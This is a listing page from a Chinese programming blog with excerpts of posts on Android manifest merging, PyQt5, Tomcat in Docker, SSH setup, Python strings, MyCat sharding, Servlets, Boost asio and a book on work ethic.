<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0da9a461c1875297a39497fef45dd67/" rel="bookmark">
			Manifest merger failed with multiple errors, see logs解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、合并优先级
清单文件合并是按照优先级进行合并的，低优先级的清单文件内容合并到高优先级的，假如合并的时候产生了冲突就需要解决冲突
2、主工程（又区分构建体、渠道、风味） &gt; module（按照依赖关系） &gt; jar 包（aar）。
3、合并冲突
当低优先级的清单文件属性合并到高优先级中，假如高优先级中没有对应的属性，则直接合并，假如有并且不一样，这时候就有了冲突，应该去解决，怎么解决？
4、补充规则：
针对要合并的值不一样，该如何去合并呢？这时候就要对一些不同属性的值在不同的情况具体对待？注意manifest中的任何attribute 都可以使用补充规则
常用的需要合并的属性值有
.Android的解决方式是使用标记，合并工具会优先在高优先级的清单文件中寻找这些标记，这一点要记住。另外，在使用标记的时候，需要在根节点manifest中添加 tools 命名空间：
节点标记
merge tools:node = “merge/replace/strict/remove/removeAll/merge-only-attribute”
合并规则中很重要的一个规则是节点标记，而merge 是默认行为，当manifest 各节点属性没有声明节点标记时候，就会使用默认值。现在一一解释每个值的含义
merge 合并该attribute 所有的属性和子属性；
replace 替换其他的值，使用该清单文件的值（一般而言，都是替换掉低优先级的值）
strict 严格的意思，就是不同的清单文件，相同属性的值应该一样，否则编译失败。（一般而言，就是不同的清单文件同一个属性其值要一样）
remove 删除某个属性。
removeAll 删除某个属性及其嵌套的子属性。（相当于remove，不过是有些时候删除很多子属性时，方便一些）
merge-only-attribute ：Merge attributes in this tag only; do not merge nested elements 。只合并属性，不合并嵌套的属性
属性标记
tools:remove = “attr, …” 、
tools:replace=“attr, …”
tools:strict=“attr, …”
解决方案：
首先进入命令行,输入命令
gradlew processDebugManifest --stacktrace 其中,processDebugManifest是log里面提到的,这个命令是会了获取更多的log信息。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1459ec59f03e449a4d35be03d301d71d/" rel="bookmark">
			pyqt5 实现根据事件节点自动弹窗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. 需求2. 例子3. 实现代码 1. 需求 根据一个事件的进度节点，实现
自动弹窗，窗口中反映节点内容自动销毁弹窗 由于用QThread做多线程较为繁琐，同时采用QMessage消息框需要手动点击，无法简单实现上述需求。这里，采用QTimer+子窗口的方式实现。
这里主要参考博客《在PYQT5中，点击主窗口中的按钮，弹出子窗口》和博客《PyQt5中QTimer的使用》。
2. 例子 这里，假设需要制作一个界面，界面实现计数功能，每隔10秒钟弹窗，窗口中提示当前是多少计数。
实现效果如下：
3. 实现代码 from PyQt5.QtWidgets import * from PyQt5.QtCore import * import sys class Main(QWidget): def __init__(self): QWidget.__init__(self) self.setFixedSize(650, 400) # 窗口大小 self.setWindowTitle("主窗口") # 开始计数按钮 start_button = QPushButton("开始计数", self) # 关联到计数函数 start_button.clicked.connect(self.start_calculation) # 终止计数按钮 stop_button = QPushButton("终止计数", self) stop_button.clicked.connect(self.stop_calculation) # 布局 layout = QGridLayout() layout.addWidget(start_button, 1, 1) layout.addWidget(stop_button, 1, 2) self.setLayout(layout) # 子窗口对象是否存在 self.childWindowExist = False # 默认为不存在 # 开始计数 def start_calculation(self): print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1459ec59f03e449a4d35be03d301d71d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a4df9b2514d2048968da35ba33fc2cf/" rel="bookmark">
			解决docker内tomcat容器启动成功后，无法访问tomcat页面(404)问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先 tomcat镜像存在，并且外部映射启动成功，
通过 docker ps也可以查看到正在运行
但是当我访问 虚拟机ip：8888 时页面提示未找到
后来在虚拟机内部访问发现也是404，
OK 查找原因
通过 docker exec -it 容器id(即已启动的tomcat容器id) /bin/bash 命令进入容器内部，
然后输入ls 查看
然后再输入 ls webapps 命令，查看webapps文件夹
查了次发现webapps文件夹下为空，怪不得tomcat 404找不到
下面把webapps这个空文件夹删除，把webapps.dist当做新的webapps文件
命令是 rm -rf webapps 强制删除
然后输入 mv webapps.dist webapps 把webapps.dist文件 当做新的webapps文件，
然后依次输入ls 和ls webapps查看新的webapps文件下是否有东西
这时 输入exit命令退出该目录，输入 docker ps 查看一下正在运行的容器
重新访问 主机ip:8888
成功！！
但是！！ 但是！！
但是我发现当我另外起一个端口 即执行docker run -d -p 8889:8080 tomcat命令时
访问主机ip：8889 又会出现404的状况，也就是说 我们又得执行上述操作才能正常访问，
这样实在太麻烦了，最后找到一个一劳永逸的方法====&gt; 更换tomcat镜像版本，
记住一定要tomcat 8.0.52版本！！！记住一定要tomcat 8.0.52版本！！！记住一定要tomcat 8.0.52版本！！！
这时再把容器运行起来，然后就可以直接访问
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3a2e16c95ef91a8100abc538e47316f/" rel="bookmark">
			火狐浏览器的恢复帐号密码方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题：换了电脑，重新安装了火狐浏览器，结果火狐里保存的帐号和密码都不进行自动输入了，研究了办天，终于解决。
解决方法：
1、在新浏览器地址栏：about:profiles
2、在旧浏览器地址栏输入about:profiles，找到末尾带elease的文件夹复制到新电脑的相同位置
3、新电脑建新的配置文件
4、选在新的浏览器实例中启动配置文件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3c5387696b57b3b42f7fbe2836774c4/" rel="bookmark">
			PyQT5启动的时候会自动按一下按钮么？为什么启动的时候会自动将QLineEdit中的内容输出来？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PyQT5启动的时候会自动按一下按钮么？为什么启动的时候会自动将QLineEdit中的内容输出来？
&gt; from PyQt5.QtWidgets import QApplication, QMainWindow, QPushButton, &gt; QPlainTextEdit, QLineEdit, QFormLayout, QWidget, \ &gt; QHBoxLayout &gt; &gt; class testwindow(QWidget): &gt; def __init__(self): &gt; super(testwindow, self).__init__() &gt; self.initui() &gt; self.btnslot() &gt; def initui(self): &gt; layout = QHBoxLayout() &gt; layout1 = QFormLayout() &gt; btn = QPushButton("打印") &gt; self.inputdata = QLineEdit("a") &gt; self.inputdata.setGeometry(0,0,12,12) &gt; layout1.addRow(self.inputdata, btn) &gt; btn.clicked.connect(self.btnslot) &gt; layout.addLayout(layout1) &gt; self.setLayout(layout) &gt; def btnslot(self): &gt; text = self.inputdata.text() &gt; print(text) &gt; &gt; if __name__ == "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3c5387696b57b3b42f7fbe2836774c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f014214e620bfebfb57eca517737b6ae/" rel="bookmark">
			unity 获取3D物体的方向数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		gameobject.transform.localEulerAngles
用此方法可获取3D物体的旋转角度（即控制面板中的角度数据）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e1407bc7acbee0ca255aa4c0a2e114ba/" rel="bookmark">
			学习记录 Halcon 图片拼接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、图像拼接步骤 1.拍图
2.图像预处理
3.提取特征点
4.特征点匹配
5.求变换矩阵
6.拼接
二、拼接算子 1.proj_match_points_ransac(Image1, Image2 : : Rows1, Cols1, Rows2,Cols2, GrayMatchMethod, MaskSize, RowMove,ColMove, RowTolerance,ColTolerance, Rotation,MatchThreshold, EstimationMethod, DistanceThreshold, RandSeed :HomMat2D, Points1, Points2)
说明：通过点对匹配（点与点之间对应关系），计算两个图像之间的投影变换矩阵 参数简介：
image1(in)：输入图像1（可以输入图像对）
image2(in)：输入图像2（可以输入图像对）
Rows1 (input_control)：图1特征点的行坐标。（Image1特征点的行列坐标）
Cols1 (input_control)：图1特征点的列坐标。
Rows2 (input_control)：图2特征点行坐标（Image2特征点的行列坐标）
Cols2 (input_control)：图2特征点的列坐标。
GrayMatchMethod (input_control) ：灰度值比较度量。（‘ssd’，则使用灰度值差的平方和，‘sad’表示绝对差的和，‘ncc’表示归一化的互相关。）
MaskSize (input_control) ：灰度掩膜尺寸。（将图片分为很多小格子，在小格子内进行匹配）
RowMove (input_control)：平均行坐标移位。
ColMove (input_control) ：平均列坐标偏移。
RowTolerance (input_control)：匹配搜索窗口的半高。
ColTolerance (input_control) ：匹配搜索窗口的半宽。
Rotation(input_control) ：旋转角度范围。
MatchThreshold (input_control) ：灰度值匹配阈值。（只有当度量值低于 MatchThreshold( 匹配阈值） (‘ssd’，‘sad’)或高于 MatchThreshold (‘ncc’)时，才接受找到的匹配。）
EstimationMethod (input_control)：变换矩阵估计算法。
DistanceThreshold (input_control)：转换一致性检查的阈值。
RandSeed (input_control) ：为随机数生成器生成种子。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e1407bc7acbee0ca255aa4c0a2e114ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a801760f8201591b9d6e092914c3d64b/" rel="bookmark">
			解决Vmware虚拟机偶尔黑屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因为启用了3D图形加速，关闭即可
设置-&gt;显示器-&gt;加速3D图形
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/075a8ef6714a60bc6c0872793bdafbc1/" rel="bookmark">
			浅析Java设计模式【5】——责任链
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 背景 近期我有个需求，需要实现类似流程功能。我们开发人员本身条件限制，他使用原始的数据库中间状态来实现，但是代码堆的非常多、上下文逻辑很混乱、BUG 多，没有达到预期设定的要求。
事后，我想了下，如果换做是我，我该怎么做？
分析此类业务的特点，流程，我想到了 责任链 。
2. 概念 责任链模式（Chain of Responsibility）是设计模式的一种，属于 行为型设计模式 。
为请求创建了一个链，请求在链上被处理。通常某个处理器如果不能处理该请求，那么它会把相同的请求传给链上的下一个处理器。
2.1. 使用场景 如果一个请求需要经过多个处理步骤，将多个处理的步骤抽象成一条 执行链 ，那么便可以使用责任链模式。
责任链的使用场景一般有：
向多处理器提交一个请求，最终运行时只会有一个处理器处理请求；向多处理器提交一个请求，所有处理器都会处理请求。 在现实中，我们很多场景都使用到了责任链模式。
RBAC 模型 ：多条件流程判断ERP 系统流程审批：总经理、销售总监、产品部经理、项目组长Java MVC 过滤器的底层实现 Filter 2.2. 优缺点 2.2.1. 优点 降低耦合度。它将请求的发送者和接收者解耦简化了对象，使得对象不需要知道链的结构增强给对象指派职责的灵活性，允许动态地新增或者删除责任链增加新的请求处理类方便 2.2.2. 缺点 不能保证请求一定被接收；系统性能将受到一定影响，调试时不方便，可能会造成循环调用 3. 模式结构 3.1. 对象定义 3.1.1. Handler抽象处理者 handler 定义处理请求的接口， handler 知道下一个处理者是谁，如果自己无法处理请求，就转给下一个处理者。
3.1.2. ConcreteHandler 具体的处理者是处理请求的具体角色
3.1.3. Client 请求者角色，就是向第一个具体的 handler 发送请求的角色，并连接好责任链。
3.2. 传统样例 3.2.1. 抽象处理 public abstract class AbstractHandler { /** * 定义下一用当前抽象类来接收 */ protected AbstractHandler next; public void setNext(AbstractHandler next) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/075a8ef6714a60bc6c0872793bdafbc1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61116a1292fdb510e67a5164d0eb9ce3/" rel="bookmark">
			ssh、rsync服务学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SSH篇： 1.使用vmvare下发两台机器ssh-server和ssh-client
1.客户端跟服务端都安装openssh,并查看是否成功 [root@aaa opsadmin]# yum install -y openssh [root@aaa opsadmin]# rpm -qa |grep openssh 2.查看openssh生成的文件列表及主要文件说明 服务端： # rpm -ql openssh-server # 配置文件 /etc/ssh/sshd_config	=&gt; ssh服务的主配置文件 /etc/sysconfig/sshd # 服务管理脚本 /usr/lib/systemd/system/sshd.service	=&gt; systemctl start sshd # 文件共享服务 提供文件上传下载的服务 /usr/libexec/openssh/sftp-server # 二进制文件程序文件 /usr/sbin/sshd # 公钥生成工具 /usr/sbin/sshd-keygen 客户端： # 客户端配置文件 /etc/ssh/ssh_config # 远程copy命令 服务器间进行文件传输 /usr/bin/scp # sftp客户端 上传下载文件操作 /usr/bin/sftp /usr/bin/slogin /usr/bin/ssh /usr/bin/ssh-add /usr/bin/ssh-agent /usr/bin/ssh-copy-id /usr/bin/ssh-keyscan 3.客户端创建用户并授权 # 创建html前端组 # groupadd html # 创建组内用户tom与jerry # useradd -g html tom # useradd -g html jerry 创建密码 # echo 123456 |passwd --stdin tom # echo 123456 |passwd --stdin jerry 创建用户数据目录并修改属组 mkdir -p /code/html chgrp -R html /code/html chmod g+w /code/html 组内用户写入文件权限 设置粘滞位防止误删除 （粘滞位T，只允许文件创建者和root用户删除文件） chmod 1770 /code/html 不验证指纹登录 # vim /etc/ssh/ssh_config 35行 StrictHostKeyChecking no 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61116a1292fdb510e67a5164d0eb9ce3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df557ea933c2864a72748b05476a8ced/" rel="bookmark">
			“人生苦短，我用Python“——python基础＜3＞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python变成入门总结3 字符串什么是字符串的驻留机制？字符串的查询操作字符串的大小写转换操作字符串内容对齐操作字符串分隔操作方法判断字符串的方法字符串操作的其他方法字符串的比较操作字符串的切片操作格式化字符串字符串的编码转换 函数函数的创建与调用函数调用的参数传递函数调用的参数传递内存分析图函数的返回值函数定义默认值参数个数可变的位置参数/关键字形参函数的参数总结变量的作用域递归函数递归计算阶乘斐波那契数列 BugBug常见类型异常处理机制python中常见的异常类型traceback模块 字符串 在Python中字符串是基本数据类型，是一个不可变的字符序列。
什么是字符串的驻留机制？ 仅保存一份相同且不可变字符串的方法，不同的值被存放在字符串的驻留池中，Python的驻留机制对相同的字符串只保留一份拷贝，后续创建相同字符串时，不会开辟新空间，而是把该字符串的地址赋给新创建的变量。
a='Python' b="Python" c='''Python''' print(a,id(a))#Python 2794637196512 print(b,id(b))#Python 2794637196512 print(c,id(c))#Python 2794637196512 地址相同，abc变量中存储的是同一个引用。 驻留机制的集中情况(交互模式)
字符串的长度为0或1时。符合标识符的字符串。字符串只在编译时进行驻留，而非运行时。[-5,256]之间的整数数字。 sys中的intern方法强制2个字符串指向同一对象。
PyCharm对字符串进行了优化处理
s1='abc%' s2='abc%' print(s1 is s2)#True 字符串驻留机制的优缺点
当需要值相同的字符串时，可以直接从字符串池里拿来使用，避免频繁的创建和销毁，提升效率和节约内存，因此拼接字符串和修改字符串是会比较影响性能的。在需要进行字符串拼接时建议使用str类型的join方法，而非+，因为join()方法是先计算出所有字符中的长度，然后再拷贝，只new一个对象，效率要比"+“高(”+"拼接需要new多个对象：例如’a’+‘b’，new两个对象)。 字符串的查询操作 方法名称作用index()查找子串substr第一次出现的位置，如果查找的子串不存在时，则抛出ValueErrorrindex()查找子串substr最后一次出现的位置，如果查找的子串不存在时，则抛出ValueErrorfind()查找子串substr第一次出现的位置，如果查找的子串不存在时，则返回-1rfind()查找子串substr最后一次出现的位置，如果查找的子串不存在时，则返回-1 s='hello,hello' print(s.index('lo'))#3 print(s.find('lo'))#3 print(s.rindex('lo'))#9 print(s.rfind('lo'))#9 print(s.index('k'))#ValueError: substring not found 查询不存在的元素，报错 print(s.find('k'))#-1 查询不存在元素，返回-1 字符串的大小写转换操作 方法名称作用upper()把字符串中所有字符都转成大写字母lower()把字符串中所有字符都转成小写字母swapcase()把字符串中所有大写字母转成小写字母，把所有小写字母都转成大写字母capitalize()把第一个字符转换为大写，把其余字符转换成小写title()把每个单词的第一个字符转换为大写，把每个单词的剩余字符转换为小写 s='hello,python' a=s.upper() print(a)#HELLO,PYTHON print(id(a))#2149937377456 print(id(s))#2149937342960 会产生新的对象 b=s.lower() print(b,id(b))#hello,python 2067692450160 print(s,id(s))#hello,python 2067692415472 虽然都是小写，转化后也会产生一个新的对象。这里驻留机制可解释，转换操作在运行后。 s2='hello,Python' print(s2.swapcase())#HELLO,pYTHON print(s2.title())#Hello,Python 字符串内容对齐操作 方法名称作用center()居中对齐，第1个参数指定宽度，第2个参数指定填充符，第2个参数是可选的，默认是空格，如果设置宽度小于实际宽度则返回原字符串ljust()左对齐，第1个参数指定宽度，第2个参数指定填充符，第2个参数是可选的，默认是空格，如果设置宽度小于实际宽度则返回原字符串rjust()右对齐，第1个参数指定宽度，第2个参数指定填充符，第2个参数是可选的，默认是空格，如果设置宽度小于实际宽度则返回原字符串zfill()右对齐，左边用0填充，该方法只接收一个参数，用于指定字符串的宽度，如果指定的宽度小于等于字符串的长度，返回字符串本身 s='hello,Python' print(s.center(20,'*'))#****hello,Python**** print(s.ljust(20,'*'))#hello,Python******** print(s.ljust(10))#print(s.ljust(10)) print(s.rjust(20,'*'))#********hello,Python print(s.rjust(10))#hello,Python print(s.zfill(20))#00000000hello,Python print(s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df557ea933c2864a72748b05476a8ced/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/685b89d688818ff5cf9f18fa8e2c7934/" rel="bookmark">
			IDEA2022中一个模块同时运行多个实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IDEA2022中一个模块同时运行多个实例 我的语雀连接：
https://www.yuque.com/docs/share/68cf0fee-01c1-4614-957d-2aceaf272420?# 《IDEA2022中一个模块同时运行多个实例》 我的idea版本
1、右击需要运行多个实例的模块。
2、修改name名称：一般给后面加个端口号即可
3、点击红框处
4、勾选红框内容
会多出红框处的内容
5、点击红圆框
6、输入：你要输入的内容（一般如图即可）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/298a88eb003002def3b3fa4a3f2e3796/" rel="bookmark">
			MyCat 使用详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、MyCat 介绍
二、MyCAT架构
三、MyCat分库分表
四、MyCat安装
五、Mycat分库分表和读写分离 六、MyCat相关配置及概念
（一）重要概念
（二）配置schema.xml （三）配置server.xml
(四)配置rule.xml
1、分片规则
2、rule.xml配置
七、测试
（一）分表测试
（二）项目测试
一、MyCat 介绍 MyCAT是一个数据库中间件。国产开源项目，前身是cobar项目。
MyCat对那些数据库支持呢
二、MyCAT架构 如图所示：MyCAT使用Mysql的通讯协议模拟成了一个Mysql服务器，所有能使用Mysql的客户端以及编程语言都能将MyCAT当成是Mysql Server来使用，不必开发新的客户端协议。
三、MyCat分库分表 · 垂直分割（分库）：指按照业务将表进行分类，分布到不同的数据库上面，这样也就将数据或者说压力分担到不同的库上面，如下图
把usian拆成3个库
水平分割（分表）：一个表格的数据按照行分割到多个节点上，如图：
把tb_order表拆分到3个数据库里
典型的分片规则：
根据主键编号进行hash、求余，如图
四、MyCat安装 1、 下载
官方网站：上海云业网络科技有限公司
github地址：MyCATApache · GitHub
2、安装Mycat
1、 把MyCat的压缩包上传到linux服务器
2、解压缩，得到mycat目录
[root@centos upload]# tar -zxvf Mycat-server-1.6-RELEASE-20161028204710-linux.tar.gz -C /usr/local
3、启动和关闭MyCat
进入mycat/bin，启动MyCat
启动命令：./mycat start
停止命令：./mycat stop
重启命令：./mycat restart
查看状态：./mycat status
注意：可以使用mysql的客户端直接连接mycat服务。默认服务端口为8066
五、Mycat分库分表和读写分离 1.需求
把表分片存储到三个数据节点上。
2.安装环境
mysql节点1环境
操作系统版本 : centos6.5
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/298a88eb003002def3b3fa4a3f2e3796/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c626bd0dbfe358d8c1dcb22e4f80588/" rel="bookmark">
			Servlet基础详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是Servlet? Servlet :全称是:Servlet Applet , 服务端程序连接器(处于前端和dao层(数据访问层)之间的中间层)可交互的处理客户端发送给服务端的请求,并完成操作动态网页技术JavaWeb程序开发的基础,JavaEE规范的组成部分 Servlet本质: 运行在web服务器之上 狭义上的Servlet是一个接口 广义上是要实现这个Servlet接口的类 注意: 开发服务端程序: 需要有一个web服务器(Tomcat服务器)
Servlet的作用: 接收客户端请求,完成操作.动态生成网页,页面数据可变将包含操作结果的动态网页响应给客户端 Servlet的执行流程: 1.浏览器向服务端发送请求
http://localhost:8080/day44_servlet_war_exploded/login
2.Tom接收请求,解析URL中的URI
3.找到web的上下文路径下面的web-INF----全局配置文件web-xml
3.1找到/映射名---&gt;找到servlet名称---Myservlet
4.获取servlet-class--全限定名称
Class c=Class.forName("全限定名称");
5.创建当前类对象
Object obj=c.newIntance();
6.调用里面doxxx方法--通过字节码文件对象获取成员方法
7.解析doGet();
响应信息呈现给用户
Servlet的生命周期: 体系结构:
Servlet是单例模式 单例设计模式是创建型设计模式的一种
单例设计模式思想:在内存中始终创建一个对象
单例设计模式有两种模式:
饿汉式: 不会出现安全问题的一种单例模式 ------&gt;类一加载,就立即创建当前类实例!
当前类的无参构造方法私有化在类的成员位置,创建一个当前类的实例(实例变量),私有的对外提供静态的公共访问方法,返回值是当前类本身 Java提供了Runtime---标准的单例模式之饿汉式
通过 ava应用程序获取计算机相关环境的信息
代码提现: public class Student { //在类的成员位置,创建一个当前类的实例(实例变量),私有的 private static Student s = new Student() ; //无参构造方法私有化 private Student(){} //对外提供静态的公共访问方法,返回值是当前类本身 public static Student getStudent(){ return s ; } } 懒汉式: 懒汉式:可能出现安全问题的单例模式
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c626bd0dbfe358d8c1dcb22e4f80588/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3519f649b11fb66b1f5be425eb863b87/" rel="bookmark">
			稻盛和夫《干法》
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么要工作？
磨炼灵魂，提升心志。
只有通过长时间不懈的工作，磨砺了心志，才会有厚重的人格，在生活中沉稳而不摇摆。
工作是人生最尊贵、最重要、最有价值的行为。
劳动的意义不仅在于追求业绩，更在于完善人的内心。
及时在苦难中，只要拼命工作，就能带来不可思议的好运。
冬天月寒冷，樱花就开得越烂漫。人也一样，不体验痛苦和烦恼，就很难有大的发展，就不会抓住真正的幸福。
人生中的困难和挫折，正是我人生的起点，或许是我最大的“幸运”。
不管是顺境也好，逆境也罢，不管自己在何种境遇，都要抱着积极的心态朝前看，任何时候都要拼命工作，持续努力，这才是最重要的。
即使你讨厌工作，但又不得不努力工作，那么在努力工作的过程中，你脆弱的心灵就会得到锤炼，你的人格就能得到提升，你就能抓住幸福人生的契机。
“愚直地、认真地、专业地、诚实地”投身于自己的工作，长此以往，人就能很自然地抑制自身的欲望。此外，热衷于工作，还能镇住愤怒的心，也会无暇发牢骚，而且日复一日的努力工作，还能一点一点提升自己的人格。
在人生中，提升心志这件事，说起来容易，做起来难，要实践并不简单。
磨炼灵魂，就会产生利他之心。
全神贯注于自己的工作，只要做到这一点，就可以磨炼自己的灵魂，铸就美好的心灵。有了美好的心灵，就会很自然地去想好事，做好事，为社会、为他人着想，并落实在行动中，你的命运就一定会向着好的方向转变。
应该迷恋工作、热爱工作、拥抱工作。无论如何，必须得喜欢上自己的工作。对自己的工作、对自己的产品，如果不注入如此深沉的关爱之情，事情就很难做得出色。
想要成就某项事业，就必须成为能够自我燃烧的人。要成为“自燃型”的人，在热爱自己工作的同时，必须持有明确的目标。
希望你们在工作中为自己的小小成功感到欣喜。要抱有一颗善被感动的心，要诚挚地对待生活。请把感动带来的能量当做动力，更加努力地工作！这就是在漫长人生征途中顽强生活的最好的方式，也是我不渝的信念。
倾听产品的声音，用心观察产品的细节，就能自然地明白问题和差错的原因所在。
所谓“自燃型”的人，从来不是“等别人吩咐了才去干”“因为有了命令才工作”的人，而是“在别人吩咐之前自发去干”的主动积极的人，他们应该都是热爱工作的人。
无论遇到什么事情都要感谢
我们必须理性的把这句话灌输进自己的脑袋里。即使感谢的情绪冒不出来，也要说服自己。也就是说，随时准备说一声谢谢，持有这种心态非常重要。
以高目标为动力，持续付出不亚于任何人的努力。
人本来就具备使梦想成真的巨大潜力。不去想，不认真思考，就什么都干不了。
所谓不亚于任何人的努力，不是说到这种程度就行了，而是没有终点、永无止境的努力。将目标一次接一次向前推进，就要进行持续的、无限度的努力。
持续就是力量，抓紧今天这一天。
所谓人生，归根到底，就是瞬间，一瞬间持续的积累，如此而已。
加倍努力，辛苦钻研，一直拼命的工作。将努力变为持续的力量，就能让你这个平凡的人变为非凡的人，你就会有强大的力量。
看起来平凡不起眼的工作，却能坚韧不拔的去做，坚持不懈的去做，这种持续的力量才是事业成功最重要的基石，才体现了人生的价值，才是真正的能力。
得意时不忘形，失意时不消沉，每天每日勤奋工作，这比什么都重要。
书中可以让我们好好工作的句子还有很多，就不一一摘抄了。总之，工作不是吃苦，努力不是压榨自己，想要过好自己的人生，就要从鞭策自己开始。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6d23a4f30e542da375ffbbea823a474/" rel="bookmark">
			初识asio
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		asio简介 asio 库基于操作系统提供的异步机制，采用前摄器设计模式(Proactor)实现了可移植的异步(或者同步)I/O操作，而且并不要求使用多线程和锁，有效地避免了多线程编程带来的诸多有害副作用（如条件竞争、死锁等)。
同步模式:
在同步模式下，程序发起一个I/o操作，向io_service提交请求，io_service把操乍转交给操作系统，同步地等待。当I/o操作完成时，操作系统通知io_service，然后io_service 再把结果发回给程序，完成整个同步流程。这个处理流程与多线程的join ()等待方式很相似。
异步模式
在异步模式下，程序除了要发起的I/0操作外，还要定义一个用于回调的完成处理函数( complete handler)。io_service同样把I/0操作转交给操作系统执行，但它不同步等待，而是立即返回。调用io_service的run ()成员函数可以等待异步操作完成，当异步操作完成时io_service 从操作系统获取结果，再调用handler执行后续的逻辑。
asio组件介绍 handle handler是asio库里的重要概念，它是符合某种函数签名的回调函数。handler必须是可拷贝的， io_service 会存储handler 的拷贝，当某种异步事件发生时io_service就会调用事件对应的handler。
asio中主要三种handle
void handler(const error_code&amp;ec)//操作错误码
void handler(const error_code&amp;ec,int signal_number)//引发操作的信号
void handler(const error_code&amp;ec,std::size_t bytes_trransferred)//传输的字节
io_service class io_service:private noncopyable { public: std::size_t run(); //阻塞事件循环 std::size_t run_one(); //阻塞至少执行一个handler std::size_t poll(); //非阻塞 执行一个ready的handler std::size_t poll_one(); //至少执行一个ready的一个handler void stop(); //停止事件循环 bool stopped() const; bool reset() const; unspecified dispatch(Handler handler);//要求异步执行一个handler unspecified post(Handler handler); class strand;//内部线程 class work;//表示有工作在进行 } io service类代表了系统里的异步处理机制(如epoll)，必须在asio库里的其他对象之前初始化，其他对象则向io_service提交异步操作的handler。 strand asio库基于操作系统的异步I/0模型，不直接使用系统线程，而是定义了一个自己的线程概念: strand，它序列化异步操作，保证异步代码在多线程的环境中可以正确地执行，无需使用互斥量。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6d23a4f30e542da375ffbbea823a474/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
